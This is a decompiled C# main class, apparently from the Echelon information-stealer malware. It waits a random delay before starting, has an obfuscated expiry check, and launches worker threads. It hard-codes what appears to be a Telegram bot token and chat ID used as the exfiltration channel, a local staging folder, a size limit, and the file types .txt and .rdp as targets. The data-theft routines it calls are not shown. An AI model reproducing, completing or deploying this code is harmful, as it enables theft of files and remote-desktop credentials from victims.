using Echelon;
using System;
using System.Threading;
using System.Windows.Forms;

internal class g
{
	public static int a;

	public static string b;

	public static string c;

	public static string d;

	public static string e;

	public static int f;

	public static string[] g;

	[STAThread]
	private static void Main(string[] args)
	{
		//Discarded unreachable code: IL_0062, IL_0074, IL_0076, IL_00a3, IL_00a8
		Thread.Sleep(new Random(Environment.TickCount).Next(1000, 4000));
		k.a();
		new Thread((ThreadStart)delegate
		{
			k.b();
		}).Start();
		new Thread((ThreadStart)delegate
		{
			h.a();
		}).Start();
		new d();
		Application.Run();
	}

	static g()
	{
		DateTime d = new DateTime(~(0x17FCE1AD ^ 0x84C0224) + 662729380 - 131041078, -(-274882128 ^ 0x10625E4C), -567908413 + 567908418);
		if ((d - DateTime.Now).TotalDays < 0.0)
		{
			throw new InvalidOperationException();
		}
		a = 30000;
		b = Global.LocalData + "\\_Y";
		c = "\\info";
		global::g.d = "865508291:AAF3yq2JkupE0cR-0kPjUMNisX31x7jiO3w";
		e = "926591428";
		f = 5500000;
		g = new string[2]
		{
			".txt",
			".rdp"
		};
	}
}
